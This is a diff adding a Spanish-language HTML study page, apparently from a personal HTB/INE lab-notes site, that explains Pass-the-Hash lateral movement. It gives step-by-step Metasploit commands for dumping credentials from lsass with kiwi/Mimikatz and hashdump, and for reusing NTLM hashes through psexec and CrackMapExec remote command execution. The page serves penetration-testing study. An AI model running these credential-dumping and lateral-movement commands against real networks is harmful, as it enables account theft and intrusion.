@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>INE - Movimiento Lateral: Pass-the-Hash (PtH)</title>
+    <meta name="description" content="Guía educativa sobre la técnica Pass-the-Hash (PtH), extracción de credenciales de lsass con Meterpreter y movimiento lateral usando Metasploit y CrackMapExec.">
+    <meta name="author" content="José Prados">
+    
+    <!-- NOTA: El archivo 'style.css' no está incluido en este bloque, asumiendo que existe externamente. -->
+    <link rel="stylesheet" href="style.css"> 
+</head>
+<body>
+
+    <div class="fixed-header-container">
+        <header class="main-header">
+            <h1 class="site-title">Máquinas HTB / INE</h1>
+        </header>
+
+        <nav class="main-nav">
+            <ul>
+                <li><a href="index.html">Inicio</a></li>
+                <li><a href="conocimientos.html">Mis Conocimientos</a></li>
+                <li><a href="maquinas.html" aria-current="page">Máquinas HTB / INE</a></li>
+                <li><a href="contacto.html">Contacto</a></li>
+            </ul>
+        </nav>
+
+        <hr class="divider">
+    </div>
+
+    <div class="content-wrapper">
+        <main class="maquina-guia">
+            
+            <h2 class="titulo-maquina">INE - Post-Explotación: Pass-the-Hash y Extracción de Credenciales</h2>
+            
+            <p class="texto-maquina">
+                <strong>Resumen:</strong> Pass-the-Hash (PtH) es una técnica crucial que permite autenticarse en sistemas Windows utilizando directamente el hash NTLM de una cuenta, sin necesidad de conocer la contraseña real. Es extremadamente útil en entornos de red donde hemos comprometido una máquina y necesitamos realizar movimiento lateral.
+            </p>
+
+            <h3>1. Obtención de Sesión Inicial con Hash (Pass-the-Hash)</h3>
+            
+            <p class="texto-maquina">
+                Para iniciar la explotación con el hash obtenido, utilizaremos un módulo auxiliar de Metasploit (a menudo relacionado con vulnerabilidades específicas o SMB) para abrir una sesión inicial.
+            </p>
+            <ol>
+                <li><strong>Abrir la Consola y la Base de Datos:</strong>
+                    <pre><code>msfconsole
+db_connect postgresql/msf:password@127.0.0.1/msf
+# Puedes necesitar buscar el módulo si ya conoces el hash
+search bad blue 
+use auxiliary/admin/smb/psexec_ntlm  # Ejemplo de módulo 'passthru'
+show options
+set RHOSTS [IP_Víctima]
+set SMBDOMAIN .
+set SMBUser [Usuario]
+set SMBPass [Hash Completo]
+exploit</code></pre>
+                    <p>Si la configuración es correcta y el hash es válido, conseguiremos una sesión <strong>Meterpreter</strong> en la máquina víctima.</p>
+                </li>
+            </ol>
+
+            <h3>2. Extracción de Credenciales (Lsass Dump)</h3>
+            
+            <p class="texto-maquina">
+                Una vez dentro con Meterpreter, el objetivo es extraer más hashes y credenciales desde el proceso <strong>lsass</strong> (Local Security Authority Subsystem Service), que gestiona la autenticación, crea tokens de acceso y escribe en el registro de seguridad.
+            </p>
+            <ol start="2">
+                <li><strong>Migración al Proceso Lsass:</strong> Primero, identificamos el PID de lsass y luego migramos la sesión a ese proceso:
+                    <pre><code>pgrep lsass
+migrate [PID_lsass]</code></pre>
+                </li>
+                <li><strong>Comprobación de Privilegios:</strong>
+                    <pre><code>getuid</code></pre>
+                    <p>Deberías ser algo como <code>NT AUTHORITY\SYSTEM</code> para poder continuar.</p>
+                </li>
+                <li><strong>Carga y Ejecución de Kiwi (Mimikatz):</strong> El módulo <code>kiwi</code> de Metasploit es el que nos permite interactuar con las funciones de extracción de credenciales (Mimikatz).
+                    <pre><code>load kiwi
+lsa_dump_sam
+# O alternativamente
+hashdump</code></pre>
+                    <p>Con <code>lsa_dump_sam</code> u <code>hashdump</code> obtendremos los credenciales NTLM, que debemos guardar en una terminal o documento de texto.</p>
+            </ol>
+
+            <h3>3. Movimiento Lateral (Técnicas)</h3>
+
+            <h4>TÉCNICA 1: Psexec en Metasploit</h4>
+            
+            <p class="texto-maquina">
+                Utilizaremos el hash NTLM recién obtenido para autenticarnos nuevamente en el sistema, esta vez usando el exploit <code>psexec</code> de Metasploit para establecer una conexión persistente.
+            </p>
+            <ol>
+                <li><strong>Configuración del Exploit:</strong> Dejamos la sesión Meterpreter en segundo plano y buscamos el módulo <code>psexec</code>.
+                    <pre><code>background
+search psexec
+use exploit/windows/smb/psexec
+show options</code></pre>
+                </li>
+                <li><strong>Ajuste de Opciones:</strong> Configura las opciones necesarias.
+                    <ul>
+                        <li><strong>LPORT:</strong> Cámbialo si el 4444 ya está en uso (ej. <code>set LPORT 4422</code>).</li>
+                        <li><strong>RHOSTS:</strong> IP de la víctima.</li>
+                        <li><strong>SMBUser:</strong> El usuario que conseguimos (ej. <code>set SMBUser Administrator</code>).</li>
+                        <li><strong>SMBPass:</strong> El hash NTLM completo (ej. <code>set SMBPass NTLM_HASH:NTLM_HASH</code>).</li>
+                    </ul>
+                </li>
+                <li><strong>Ejecución:</strong> Si el exploit falla, es fundamental elegir el <strong>target</strong> correcto.
+                    <pre><code>exploit 
+show targets
+set target 'Native Upload' # Ejemplo de target que podría funcionar
+exploit</code></pre>
+                </li>
+            </ol>
+
+            <h4>TÉCNICA 2: CrackMapExec (CME)</h4>
+            
+            <p class="texto-maquina">
+                Desde la terminal de tu atacante, puedes usar **CrackMapExec** para verificar la validez del hash o ejecutar comandos directamente sobre SMB.
+            </p>
+            <p><strong>Verificación de Credenciales (Autenticación):</strong></p>
+            <pre><code>crackmapexec smb [RHOST] -u "usuario_que_ya_conocemos" -H "HASH NTLM (el corto)"</code></pre>
+            <p><strong>Ejecución de Comandos Remotos (Ejemplo ipconfig):</strong></p>
+            <pre><code>crackmapexec smb [RHOST] -u "usuario" -H "HASH" -x "ipconfig"</code></pre>
+
+            <p><a href="maquinas.html" style="color: var(--color-oro); text-decoration: none;">← Volver al Índice de Máquinas</a></p>
+        </main>
+    </div>
+
+</body>
+</html>
